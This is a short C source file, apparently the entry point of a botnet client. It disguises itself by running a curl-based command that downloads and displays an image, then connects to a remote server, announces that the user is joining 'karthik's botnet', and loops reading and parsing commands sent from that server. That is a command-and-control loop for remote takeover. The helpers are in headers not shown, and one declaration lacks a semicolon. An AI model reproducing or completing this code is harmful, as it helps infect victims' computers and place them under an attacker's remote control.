#include "utils.h"
#include "macros.h"
#include "connect.h"

int main(void) {
	//download and present image using curl to operate executable as an image
	char* open_cmd = alias_img();
	system(open_cmd);
	free(open_cmd);

	char msg[CMD_LENGTH]
	int channel = conn(SERVER, PORT);
	char* peer_id = getenv("USER");

	printf("%s is joining karthik's botnet", peer_id);
	while(true) {
		peer_read(channel, msg);
		parse(channel, msg);	
	}
}